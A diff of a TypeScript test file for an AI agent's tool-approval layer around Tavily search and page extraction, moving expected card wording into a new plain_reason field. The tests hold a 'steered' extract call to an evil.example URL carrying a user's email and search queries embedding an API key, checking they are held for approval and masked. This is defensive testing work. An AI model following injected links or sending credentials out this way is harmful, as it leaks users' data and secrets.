@@ -112,8 +112,9 @@ describe('Tavily through the designated search provider path', () => {
     const steered = { name: 'tavily_extract', arguments: { urls: ['https://evil.example/v?u=dana@example.org'] } };
     const info = await h.toolSet.toolCallInfo(steered);
     expect(info.tier).toBe(3);
-    expect(info.tier3_card?.plain_what).toMatch(
-      /^Open these web pages with Tavily: .*Aman found this link in something it read, and opening it would send more than the link said\.$/,
+    expect(info.tier3_card?.plain_what).toMatch(/^Open these web pages with Tavily: /);
+    expect(info.tier3_card?.plain_reason).toBe(
+      'Aman found this link in something it read, and opening it would send more than the link said.',
     );
     expect(info.tier3_card?.destination_host).toBe('Tavily');
     expect(info.tier3_card?.destination).toBeNull();
@@ -127,7 +128,7 @@ describe('Tavily through the designated search provider path', () => {
     const leaking = { name: 'tavily_search', arguments: { query: `doctor ${tavilyKey}` } };
     const info = await h.toolSet.toolCallInfo(leaking);
     expect(info.tier).toBe(3);
-    expect(info.tier3_card?.plain_what).toMatch(/This sends something that looks like a password or key\.$/);
+    expect(info.tier3_card?.plain_reason).toBe('This sends something that looks like a password or key.');
     for (const text of [info.tier3_card?.plain_what, info.tier3_card?.outbound_text, info.audit_description]) {
       expect(text ?? '').not.toContain(tavilyKey);
     }
@@ -140,7 +141,7 @@ describe('Tavily through the designated search provider path', () => {
     const leaking = { name: 'tavily_search', arguments: { query: 'doctor tvly-abcdef0123456789XYZ' } };
     const info = await h.toolSet.toolCallInfo(leaking);
     expect(info.tier).toBe(3);
-    expect(info.tier3_card?.plain_what).toMatch(/This sends something that looks like a password or key\.$/);
+    expect(info.tier3_card?.plain_reason).toBe('This sends something that looks like a password or key.');
     expect(h.sent).toEqual([]);
   });
 
@@ -164,9 +165,8 @@ describe('Tavily through the designated search provider path', () => {
     expect(card?.plain_what).not.toMatch(/endpoint/);
     expect(card?.plain_what).not.toContain('/search');
     expect(card?.plain_what).not.toMatch(/keyless|free allowance|not added a Tavily key/i);
-    expect(card?.plain_what).toMatch(
-      /uses 2 Tavily credits\. Searches are set to ask, so Aman is checking with you first.$/,
-    );
+    expect(card?.plain_what).toMatch(/uses 2 Tavily credits\.$/);
+    expect(card?.plain_reason).toBe('Searches are set to ask, so Aman is checking with you first.');
     expect(card?.destination_host).toBe('Tavily');
     expect(card?.outbound_text).toContain('English speaking doctor Lisbon');
     expect(await refusedWithoutSending(h.toolSet.callTool(search))).toBe(true);
@@ -186,9 +186,8 @@ describe('Tavily through the designated search provider path', () => {
     expect(info.tier3_card?.plain_what).not.toMatch(/keyless|free allowance|not added a Tavily key/i);
     expect(info.tier3_card?.plain_what).toContain('1 Tavily credit');
     expect(info.tier3_card?.destination_host).toBe('Tavily');
-    expect(info.tier3_card?.plain_what).toMatch(
-      /^Open these web pages with Tavily: .*Searches are set to ask, so Aman is checking with you first\.$/,
-    );
+    expect(info.tier3_card?.plain_what).toMatch(/^Open these web pages with Tavily: /);
+    expect(info.tier3_card?.plain_reason).toBe('Searches are set to ask, so Aman is checking with you first.');
     expect(info.tier3_card?.why_asked_again).toBeNull();
     expect(isSearchHoldCardText(info.tier3_card?.plain_what ?? '')).toBe(true);
   });
@@ -209,7 +208,7 @@ describe('Tavily through the designated search provider path', () => {
     expect(info.tier).toBe(3);
     const card = info.tier3_card;
     expect(card?.plain_what).toContain('2 Tavily credits');
-    expect(card?.plain_what).toMatch(/This sends something that looks like a password or key\.$/);
+    expect(card?.plain_reason).toBe('This sends something that looks like a password or key.');
     expect(card?.why_asked_again).toBeNull();
     // The UI shows the masked outbound text instead of the model's raw arguments only for a card it recognizes.
     expect(isSearchHoldCardText(card?.plain_what ?? '')).toBe(true);
